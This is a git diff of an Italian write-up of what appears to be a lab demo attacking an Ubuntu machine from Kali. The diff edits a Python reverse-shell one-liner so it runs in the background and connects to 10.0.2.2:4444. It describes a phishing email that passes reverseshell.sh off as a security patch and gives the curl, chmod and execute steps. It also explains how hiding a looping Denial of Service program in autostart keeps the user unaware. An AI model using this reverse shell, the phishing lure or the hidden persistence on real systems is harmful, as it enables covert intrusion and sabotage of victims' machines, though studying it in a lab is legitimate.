@@ -10,9 +10,9 @@ L'obiettivo della demo è di creare un Denial of Service persistente su una macc
 Per prima cosa sono stati creati tutti i file necessari su Kali.
 Per primo il file `reverseshell.sh`, dove è presente il [payload](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#perl) in python 
 <pre>
-export RHOST="10.0.2.2";export RPORT=4444;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+export RHOST="10.0.2.2";export RPORT=4444;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")&'
 </pre>
-che permette di creare la reverse shell quando eseguito sulla macchina attaccata.
+che permette di creare una reverse shell in background quando eseguito sulla macchina attaccata.
 Poi, è stato creato un semplicissimo programma in C, `dos.c`, contenente un ciclo while infinito che continua ad aprire finestre di terminale:
 <pre>
 #include <stdlib.h>
@@ -38,6 +38,7 @@ Comment[eu_US]=
 Comment=
 </pre>
 che verrà utilizzato per inserire il programma che esegue il Denial of Service tra le applicazioni che si aprono all'avvio della macchina. 
+I flag Hidden e NoDisplay, per evidenziare il Denial of Service, sono stati messi a false, se vengono settati a true, il programma viene eseguito senza che l'utente si accorga di nulla, quindi la macchina viene rallentata senza la riesca a capire il motivo.
 Una volta creati i file, è stata creato anche un web file server sulla porta 80, utilizzando il comando 
 `python -m http.server 80`
 
@@ -47,7 +48,9 @@ A questo punto, l'unica cosa che rimane da fare, è mettersi in ascolto sulla po
 
 # Reverse shell 
 
-Per creare la reverse shell, è necessario che l'utente sulla macchina attaccata venga convinto a scaricare ed eseguire 
+Per creare la reverse shell, è necessario che l'utente sulla macchina attaccata venga convinto a scaricare ed eseguire il file `reverseshell.sh`, questo potrebbe essere fatto creando una mail di phishing e convincendolo, per esempio, che si tratti di una patch di sicurezza. Nella demo, viene utilizzando il comando `curl -O "http://10.0.2.2/demo/reverseshell.sh"`, che scarica il file dal web file server creato su Kali, a questo punto si esegue il comando `sudo chmod +x reverseshell.sh` che aggiunge il permesso di esecuzione al file con privilegi di amministratore, infine viene eseguito il file con `./reverseshell.sh`. 
+A questo punto, essendo la reverse shell eseguita in background, l'utente su Ubuntu può continuare ad utilizzare il terminale normalmente, senza accorgersi di nulla, ma in realtà è connesso sulla porta 4444 alla macchina Kali attraverso una reverse shell.
+
 
 _Figure 1: The Markdown Mark_
 
